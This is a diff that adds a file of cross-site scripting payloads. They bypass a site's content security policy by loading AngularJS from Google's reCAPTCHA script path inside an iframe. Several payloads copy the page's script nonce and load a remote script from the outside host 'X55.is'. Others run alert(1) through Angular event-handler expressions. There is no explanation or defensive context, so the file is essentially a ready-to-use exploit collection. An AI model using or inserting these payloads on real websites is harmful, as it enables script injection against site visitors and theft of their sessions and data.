@@ -1,0 +1,34 @@
+document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//X55.is&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
+">`
+
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//X55.is";b.nonce=a.nonce;w.body.appendChild(b)'>
+
+
+document.getElementsByTagName("script")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//X55.is&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
+</script>
+">`
+
+document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src ng-on-error='s=$event.target.ownerDocument.createElement(&quot;script&quot;);s.nonce=&quot;nonce-value&quot;;s.innerHTML=&quot;alert(1)&quot;;$event.target.ownerDocument.body.appendChild(s)'>
+">`
+
+
+document.body.innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
+">`
+
+document.body.innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
+<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script>
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+</div>
+">`
+
+test"</script><script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script>
+<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
